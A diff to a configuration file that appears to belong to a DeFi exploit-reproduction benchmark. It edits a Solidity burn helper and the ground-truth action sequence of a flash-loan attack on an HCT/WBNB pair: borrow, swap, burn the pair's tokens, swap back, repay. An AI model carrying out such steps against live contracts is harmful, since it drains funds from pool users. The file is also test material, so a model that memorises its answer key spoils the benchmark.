@@ -17,8 +17,7 @@ ctrt_name2deploy:
   
 extra_actions:
  - "function burn_hct_pair(uint256 amount) internal eurus {
-      uint256 initBalance = hct.balanceOf(address(attacker));
-      while (hct.balanceOf(address(attacker)) > initBalance - amount) {
+      while (hct.balanceOf(address(attacker)) > amount) {
         hct.burn(hct.balanceOf(address(attacker)) * 8 / 10 - 1);
       }
       pair.sync();
@@ -33,7 +32,7 @@ attack_goal_str: "wbnb; 1e12"
 groundtruth:
   - ["borrow", "wbnb", "owner", "2200 * 1e18"]
   - ["swap", "pair", "attacker", "wbnb", "hct", "wbnb.balanceOf(attacker)", "pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb)) * 99 / 100"]
-  - ["burn", "hct", "pair", "hct.balanceOf(attacker) - 70"]
+  - ["burn", "hct", "pair", "70"]
   - ["swap", "pair", "attacker", "hct", "wbnb", "hct.balanceOf(attacker)", "pair.getAmountOut(hct.balanceOf(attacker), address(hct))"]
   - ["payback", "wbnb", "owner", "2200 * 1e18"]
 
